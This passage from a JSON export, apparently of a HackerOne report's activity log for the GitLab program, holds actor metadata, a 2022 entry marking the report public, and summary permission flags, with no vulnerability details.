        "username": "nmalcolm_gitlab",
        "cleared": false,
        "verified": false,
        "url": "/nmalcolm_gitlab",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/qugqy57v49704ukw2816cro62zrc/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 18350818,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportBecamePublic",
      "message": "",
      "automated_response": false,
      "created_at": "2022-09-13T04:40:52.149Z",
      "updated_at": "2022-09-13T04:40:52.149Z",
      "actor": {
        "username": "nmalcolm_gitlab",
        "cleared": false,
        "verified": false,
        "url": "/nmalcolm_gitlab",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/qugqy57v49704ukw2816cro62zrc/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    }
  ],
  "activity_page_count": 1,
  "activity_page_number": 1,
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}